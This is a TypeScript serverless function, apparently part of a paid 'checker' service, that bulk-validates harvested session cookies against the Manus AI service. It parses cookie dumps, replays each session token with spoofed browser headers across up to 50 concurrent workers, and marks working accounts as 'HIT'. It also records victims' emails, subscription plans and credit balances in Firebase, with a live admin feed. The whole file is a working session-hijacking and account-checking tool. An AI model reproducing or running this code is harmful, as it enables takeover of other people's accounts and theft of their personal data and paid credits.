import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { firebasePush, firebaseGet, verifyFirebaseIdToken } from "../_shared/firebase-admin.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-firebase-token, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

interface CheckRequest {
  cookies: string[];
  threads?: number;
  username?: string;
  clientInfo?: {
    timezone?: string;
    country?: string;
    userAgent?: string;
    browserIP?: string;
  };
}

interface CheckResult {
  id: string;
  filename: string;
  status: 'success' | 'failed';
  email: string;
  name: string;
  membership: string;
  plan: string;
  totalCredits: string;
  freeCredits: string;
  usedCredits: string;
  error?: string;
  timestamp: string;
  checkDuration?: number;
  threadId?: number;
}

interface SessionInfo {
  startTime: string;
  endTime: string;
  duration: string;
  clientIP?: string;
  browserIP?: string;
  userAgent?: string;
  timezone?: string;
  country?: string;
  threadsUsed: number;
  accountsProcessed: number;
  successRate: string;
  requestId: string;
}

// Canary-style timestamp format with milliseconds
function getCanaryTimestamp(): string {
  const now = new Date();
  const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
  const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
  
  const day = days[now.getUTCDay()];
  const month = months[now.getUTCMonth()];
  const date = now.getUTCDate().toString().padStart(2, '0');
  const hours = now.getUTCHours().toString().padStart(2, '0');
  const mins = now.getUTCMinutes().toString().padStart(2, '0');
  const secs = now.getUTCSeconds().toString().padStart(2, '0');
  const ms = now.getUTCMilliseconds().toString().padStart(3, '0');
  
  return `[${day} ${month} ${date} ${hours}:${mins}:${secs}.${ms}]`;
}

// Generate unique request ID for tracking
function generateRequestId(): string {
  return `REQ-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
}

function extractCookieValue(cookieContent: string, cookieName: string): string | null {
  const patterns = [
    new RegExp(`${cookieName}\\t([^\\t\\n]+)`),
    new RegExp(`${cookieName}=([^;,\\s]+)`),
    new RegExp(`${cookieName}="([^"]+)"`),
  ];
  
  for (const pattern of patterns) {
    const match = pattern.exec(cookieContent);
    if (match) {
      return match[1];
    }
  }
  return null;
}

function parseCookieContent(cookieContent: string): { cookies: Record<string, string>; sessionKey: string | null } {
  cookieContent = cookieContent.trim();
  if (!cookieContent) {
    return { cookies: {}, sessionKey: null };
  }
  
  const cookiesDict: Record<string, string> = {};
  
  // Check if it's Netscape format (tab-separated)
  if (cookieContent.includes('\t')) {
    const lines = cookieContent.split('\n');
    for (const line of lines) {
      const trimmedLine = line.trim();
      if (trimmedLine && !trimmedLine.startsWith('#')) {
        const parts = trimmedLine.split('\t');
        if (parts.length >= 7) {
          const cookieName = parts[5];
          const cookieValue = parts[6];
          cookiesDict[cookieName] = cookieValue;
        }
      }
    }
    
    if (Object.keys(cookiesDict).length > 0) {
      const firstKey = Object.keys(cookiesDict)[0];
      return { cookies: cookiesDict, sessionKey: firstKey };
    }
  }
  
  // Check for known session cookie names
  const sessionNames = ['session_id', 'session', 'auth_token', 'token', 'auth', 'access_token', 'sid', 'jwt'];
  for (const name of sessionNames) {
    const sessionId = extractCookieValue(cookieContent, name);
    if (sessionId) {
      return { cookies: { [name]: sessionId }, sessionKey: name };
    }
  }
  
  // Try name=value format (standard cookie format)
  const matches = cookieContent.matchAll(/([^=\s;]+)=([^;\s]+)/g);
  for (const match of matches) {
    cookiesDict[match[1]] = match[2];
  }
  
  if (Object.keys(cookiesDict).length > 0) {
    const firstKey = Object.keys(cookiesDict)[0];
    return { cookies: cookiesDict, sessionKey: firstKey };
  }
  
  // Last resort: treat entire content as session token
  if (cookieContent.length > 10 && !cookieContent.includes(' ')) {
    return { cookies: { 'token': cookieContent }, sessionKey: 'token' };
  }
  
  return { cookies: {}, sessionKey: null };
}

// Fetch with timeout and retry
async function fetchWithTimeout(
  url: string, 
  options: RequestInit, 
  timeout: number = 15000,
  retries: number = 2
): Promise<Response> {
  for (let attempt = 0; attempt <= retries; attempt++) {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), timeout);
      
      const response = await fetch(url, {
        ...options,
        signal: controller.signal,
      });
      
      clearTimeout(timeoutId);
      return response;
    } catch (error) {
      if (attempt === retries) {
        throw error;
      }
      // Wait before retry with exponential backoff
      await new Promise(r => setTimeout(r, 500 * (attempt + 1)));
    }
  }
  throw new Error('Max retries exceeded');
}

async function checkSingleAccount(
  fileContent: string, 
  filename: string, 
  idx: number,
  threadId: number,
  requestId: string
): Promise<CheckResult> {
  const startTime = Date.now();
  
  const result: CheckResult = {
    id: `${Date.now()}_${idx}_${threadId}`,
    filename,
    status: 'failed',
    email: 'N/A',
    name: 'N/A',
    membership: 'N/A',
    plan: 'N/A',
    totalCredits: 'N/A',
    freeCredits: 'N/A',
    usedCredits: 'N/A',
    timestamp: getCanaryTimestamp(),
    threadId,
  };
  
  try {
    const { cookies, sessionKey } = parseCookieContent(fileContent);
    
    if (Object.keys(cookies).length === 0) {
      result.error = 'Cannot parse cookie content';
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    // Get session_id from multiple possible names
    let sessionId: string | null = null;
    for (const name of ['session_id', 'session', 'auth_token', 'token', 'auth', 'access_token', 'sid', 'jwt']) {
      sessionId = cookies[name] || extractCookieValue(fileContent, name);
      if (sessionId) break;
    }
    
    if (!sessionId) {
      sessionId = Object.values(cookies)[0];
    }
    
    if (!sessionId) {
      result.error = 'No session ID found';
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    // Create cookie string for header
    const cookieStr = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
    
    // Request headers for Manus API
    const userInfoHeaders: Record<string, string> = {
      'Host': 'api.manus.im',
      'Referer': 'https://manus.im/',
      'Origin': 'https://manus.im',
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${sessionId}`,
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.9',
      'connect-protocol-version': '1',
      'Cookie': cookieStr,
    };
    
    // Request 1: Get user info
    const userInfoResponse = await fetchWithTimeout(
      'https://api.manus.im/user.v1.UserService/UserInfo',
      {
        method: 'POST',
        headers: userInfoHeaders,
        body: '{}',
      },
      15000,
      2
    );
    
    if (userInfoResponse.status !== 200) {
      result.error = `API error: ${userInfoResponse.status}`;
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const userData = await userInfoResponse.json();
    
    // Validate response has required fields
    if (!userData.email && !userData.avatar && !userData.displayname) {
      result.error = 'Invalid/expired cookie';
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    result.email = userData.email || 'N/A';
    result.name = userData.displayname || userData.display_name || userData.name || 'N/A';
    result.membership = userData.membershipVersion || userData.membership_version || userData.membership || 'Free';
    result.plan = userData.plan || userData.membershipVersion || userData.membership_version || 'Free';
    
    // Request 2: Get credits info
    try {
      const creditsResponse = await fetchWithTimeout(
        'https://api.manus.im/user.v1.UserService/GetAvailableCredits',
        {
          method: 'POST',
          headers: userInfoHeaders,
          body: '{}',
        },
        10000,
        1
      );
      
      if (creditsResponse.status === 200) {
        const creditsData = await creditsResponse.json();
        result.totalCredits = String(creditsData.totalCredits ?? creditsData.total_credits ?? creditsData.total ?? 'N/A');
        result.freeCredits = String(creditsData.freeCredits ?? creditsData.free_credits ?? creditsData.free ?? 'N/A');
        result.usedCredits = String(creditsData.usedCredits ?? creditsData.used_credits ?? creditsData.used ?? 'N/A');
      }
    } catch {
      // Credits fetch failed but we have user info, continue as success
      console.log(`${getCanaryTimestamp()} [${requestId}] [T${threadId}] Credits fetch failed for ${result.email}`);
    }
    
    result.status = 'success';
    result.checkDuration = Date.now() - startTime;
    
    console.log(`${getCanaryTimestamp()} [${requestId}] [T${threadId}] HIT: ${result.email} | ${result.plan} | Credits: ${result.totalCredits}`);
    
  } catch (e) {
    const errorMsg = String(e);
    if (errorMsg.includes('abort')) {
      result.error = 'Timeout';
    } else {
      result.error = `Error: ${errorMsg.substring(0, 100)}`;
    }
    result.checkDuration = Date.now() - startTime;
    console.log(`${getCanaryTimestamp()} [${requestId}] [T${threadId}] FAIL: ${filename} - ${result.error}`);
  }
  
  return result;
}

// Non-blocking worker pool with error isolation
async function processWithWorkerPool<T, R>(
  items: T[],
  concurrency: number,
  fn: (item: T, index: number, threadId: number) => Promise<R>,
  requestId: string,
  onProgress?: (completed: number, total: number) => void
): Promise<R[]> {
  const results: R[] = new Array(items.length);
  let currentIndex = 0;
  let completedCount = 0;
  const startTime = Date.now();

  async function worker(threadId: number): Promise<void> {
    while (true) {
      // Atomic index increment
      const index = currentIndex++;
      if (index >= items.length) break;
      
      try {
        const result = await fn(items[index], index, threadId);
        results[index] = result;
      } catch (error) {
        // Error isolation - never stop the pool
        results[index] = { 
          status: 'failed',
          error: String(error),
          timestamp: getCanaryTimestamp(),
          threadId
        } as R;
        console.log(`${getCanaryTimestamp()} [${requestId}] [T${threadId}] Worker error isolated: ${String(error).substring(0, 50)}`);
      }
      
      completedCount++;
      
      if (onProgress) {
        onProgress(completedCount, items.length);
      }
      
      // Progress logging every 10 items
      if (completedCount % 10 === 0 || completedCount === items.length) {
        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
        const rate = (completedCount / parseFloat(elapsed)).toFixed(1);
        console.log(`${getCanaryTimestamp()} [${requestId}] Progress: ${completedCount}/${items.length} (${rate}/s)`);
      }
      
      // Small delay between requests to avoid rate limiting
      await new Promise(r => setTimeout(r, 50));
    }
  }

  // Create workers based on concurrency
  const actualConcurrency = Math.min(concurrency, items.length, 50);
  console.log(`${getCanaryTimestamp()} [${requestId}] Starting ${actualConcurrency} workers for ${items.length} items`);
  
  const workers = Array(actualConcurrency)
    .fill(null)
    .map((_, i) => worker(i + 1));

  await Promise.all(workers);
  
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
  console.log(`${getCanaryTimestamp()} [${requestId}] All workers completed in ${totalTime}s`);
  
  return results;
}

// Get client IP from request headers
function getClientIP(req: Request): string {
  return req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
         req.headers.get('x-real-ip') ||
         req.headers.get('cf-connecting-ip') ||
         'Unknown';
}

serve(async (req) => {
  // Handle CORS preflight
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  const requestId = generateRequestId();
  const sessionStartTime = Date.now();
  const sessionStartTimestamp = getCanaryTimestamp();
  const clientIP = getClientIP(req);

  console.log(`${sessionStartTimestamp} [${requestId}] New request from IP: ${clientIP}`);

  try {
    // Verify Firebase auth token
    const firebaseToken = req.headers.get("x-firebase-token");
    let userId: string | null = null;
    
    if (firebaseToken) {
      const tokenData = await verifyFirebaseIdToken(firebaseToken);
      if (tokenData) {
        userId = tokenData.uid;
        console.log(`${getCanaryTimestamp()} [${requestId}] Auth verified for user: ${userId}`);
      }
    }

    const { cookies, threads = 10, username, clientInfo }: CheckRequest = await req.json();

    // Check service access if authenticated
    if (userId) {
      const userData = await firebaseGet<{ services?: string[]; isAdmin?: boolean }>(`users/${userId}`);
      const hasAccess = userData?.services?.includes("manus_checker") || 
                        userData?.services?.includes("all") ||
                        userData?.isAdmin;
      
      if (!hasAccess) {
        console.log(`${getCanaryTimestamp()} [${requestId}] Access denied for user: ${userId}`);
        return new Response(
          JSON.stringify({ error: "You don't have access to this service", requestId }),
          { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
        );
      }
    }

    console.log(`${getCanaryTimestamp()} [${requestId}] Starting check: ${cookies.length} cookies, ${threads} threads, user: ${username || 'anonymous'}`);

    if (!cookies || cookies.length === 0) {
      return new Response(
        JSON.stringify({ error: "Cookies are required", requestId }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // Process with thread limit
    const concurrency = Math.min(threads, 50);
    const results = await processWithWorkerPool(
      cookies,
      concurrency,
      async (cookie, idx, threadId) => checkSingleAccount(cookie, `cookie_${idx + 1}.txt`, idx, threadId, requestId),
      requestId
    );

    const sessionEndTime = Date.now();
    const durationMs = sessionEndTime - sessionStartTime;
    const durationStr = durationMs > 60000 
      ? `${Math.floor(durationMs / 60000)}m ${Math.floor((durationMs % 60000) / 1000)}s`
      : `${(durationMs / 1000).toFixed(1)}s`;

    // Calculate stats
    const successResults = results.filter(r => r.status === 'success');
    const failedResults = results.filter(r => r.status === 'failed');
    
    const stats = {
      total: results.length,
      success: successResults.length,
      failed: failedResults.length,
      successRate: `${((successResults.length / results.length) * 100).toFixed(1)}%`,
    };

    // Session info (Canary style)
    const sessionInfo: SessionInfo = {
      startTime: sessionStartTimestamp,
      endTime: getCanaryTimestamp(),
      duration: durationStr,
      clientIP: clientIP,
      browserIP: clientInfo?.browserIP || 'Unknown',
      userAgent: clientInfo?.userAgent,
      timezone: clientInfo?.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
      country: clientInfo?.country || 'Unknown',
      threadsUsed: concurrency,
      accountsProcessed: results.length,
      successRate: stats.successRate,
      requestId,
    };

    console.log(`${getCanaryTimestamp()} [${requestId}] Complete: ${stats.success} hits, ${stats.failed} failed in ${durationStr}`);

    // Save to Firebase (non-blocking) - using correct paths per Firebase rules
    if (userId) {
      // Save history under checkHistory/$uid (per Firebase rules)
      firebasePush(`checkHistory/${userId}`, {
        service: "manus_checker",
        requestId,
        inputCount: cookies.length,
        stats,
        sessionInfo,
        results: results.map(r => ({
          email: r.email,
          name: r.name,
          plan: r.plan,
          membership: r.membership,
          totalCredits: r.totalCredits,
          freeCredits: r.freeCredits,
          usedCredits: r.usedCredits,
          status: r.status,
          timestamp: r.timestamp,
          checkDuration: r.checkDuration,
          threadId: r.threadId,
        })),
        createdAt: new Date().toISOString()
      }).catch(e => console.error(`${getCanaryTimestamp()} [${requestId}] Firebase history save error:`, e));

      // Save HITS separately under adminData (admin only path)
      if (successResults.length > 0) {
        firebasePush(`adminData/manusHits/${userId}`, {
          requestId,
          hits: successResults.map(r => ({
            email: r.email,
            name: r.name,
            plan: r.plan,
            membership: r.membership,
            totalCredits: r.totalCredits,
            freeCredits: r.freeCredits,
            usedCredits: r.usedCredits,
            timestamp: r.timestamp,
          })),
          count: successResults.length,
          checkedAt: new Date().toISOString()
        }).catch(e => console.error(`${getCanaryTimestamp()} [${requestId}] Firebase hits save error:`, e));

        // Push to adminData/liveHits for admin real-time view
        for (const hit of successResults.slice(0, 10)) {
          firebasePush('adminData/liveHits', {
            service: 'manus_checker',
            username: username || 'anonymous',
            hitData: {
              email: hit.email,
              plan: hit.plan,
              totalCredits: hit.totalCredits,
            },
            createdAt: Date.now()
          }).catch(() => {});
        }
      }
    }

    return new Response(
      JSON.stringify({ results, stats, sessionInfo }),
      { 
        status: 200, 
        headers: { ...corsHeaders, "Content-Type": "application/json" } 
      }
    );

  } catch (error) {
    console.error(`${getCanaryTimestamp()} [${requestId}] Fatal error:`, error);
    return new Response(
      JSON.stringify({ error: String(error), requestId }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
